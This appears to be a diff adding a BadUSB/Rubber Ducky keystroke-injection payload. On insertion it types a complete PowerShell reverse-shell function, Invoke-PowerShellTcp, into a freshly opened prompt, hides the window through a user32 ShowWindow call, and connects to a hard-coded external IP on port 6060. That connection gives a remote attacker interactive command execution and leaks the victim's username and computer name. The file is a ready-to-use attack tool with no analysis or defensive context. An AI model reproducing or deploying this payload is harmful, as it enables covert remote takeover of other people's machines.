@@ -1,0 +1,151 @@
+DELAY 3000
+GUI r
+DELAY 300
+STRING powershell
+ENTER
+DELAY 300
+STRING function Invoke-PowerShellTcp { 
+ENTER
+STRING  
+ENTER
+STRING     [CmdletBinding(DefaultParameterSetName="reverse")] Param( 
+ENTER
+STRING  
+ENTER
+STRING         [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")] 
+ENTER
+STRING         [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")] 
+ENTER
+STRING         [String] 
+ENTER
+STRING         $IPAddress, 
+ENTER
+STRING  
+ENTER
+STRING         [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")] 
+ENTER
+STRING         [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")] 
+ENTER
+STRING         [Int] 
+ENTER
+STRING         $Port, 
+ENTER
+STRING  
+ENTER
+STRING         [Parameter(ParameterSetName="reverse")] 
+ENTER
+STRING         [Switch] 
+ENTER
+STRING         $Reverse, 
+ENTER
+STRING  
+ENTER
+STRING         [Parameter(ParameterSetName="bind")] 
+ENTER
+STRING         [Switch] 
+ENTER
+STRING         $Bind 
+ENTER
+STRING  
+ENTER
+STRING     ) 
+ENTER
+STRING  
+ENTER
+STRING     #Connect back if the reverse switch is used. 
+ENTER
+STRING     if ($Reverse) 
+ENTER
+STRING     { 
+ENTER
+STRING         $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port) 
+ENTER
+STRING     } 
+ENTER
+STRING  
+ENTER
+STRING     #Bind to the provided port if Bind switch is used. 
+ENTER
+STRING     if ($Bind) 
+ENTER
+STRING     { 
+ENTER
+STRING         $listener = [System.Net.Sockets.TcpListener]$Port 
+ENTER
+STRING         $listener.start() 
+ENTER
+STRING         $client = $listener.AcceptTcpClient() 
+ENTER
+STRING     } 
+ENTER
+STRING  
+ENTER
+STRING     $stream = $client.GetStream() 
+ENTER
+STRING     [byte[]]$bytes = 0..255|%{0} 
+ENTER
+STRING  
+ENTER
+STRING     #Send back current username and computername 
+ENTER
+STRING     $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n") 
+ENTER
+STRING     $stream.Write($sendbytes,0,$sendbytes.Length) 
+ENTER
+STRING  
+ENTER
+STRING     #Show an interactive PowerShell prompt 
+ENTER
+STRING     $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>') 
+ENTER
+STRING     $stream.Write($sendbytes,0,$sendbytes.Length) 
+ENTER
+STRING  
+ENTER
+STRING     while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) 
+ENTER
+STRING     { 
+ENTER
+STRING         $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding 
+ENTER
+STRING         $data = $EncodedText.GetString($bytes,0, $i) 
+ENTER
+STRING  
+ENTER
+STRING         #Execute the command on the target. 
+ENTER
+STRING         $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String ) 
+ENTER
+STRING  
+ENTER
+STRING         $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> ' 
+ENTER
+STRING         $x = ($error[0] | Out-String) 
+ENTER
+STRING         $error.clear() 
+ENTER
+STRING         $sendback2 = $sendback2 + $x 
+ENTER
+STRING  
+ENTER
+STRING         #Return the results 
+ENTER
+STRING         $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2) 
+ENTER
+STRING         $stream.Write($sendbyte,0,$sendbyte.Length) 
+ENTER
+STRING         $stream.Flush() 
+ENTER
+STRING     } 
+ENTER
+STRING     $client.Close() 
+ENTER
+STRING     $listener.Stop() 
+ENTER
+STRING } 
+ENTER
+STRING Add-Type -Name win -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);' -Namespace native
+ENTER
+DELAY 100
+STRING [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle,0); Invoke-PowerShellTcp -Reverse -IPAddress 51.255.35.67 -Port 6060
+ENTER
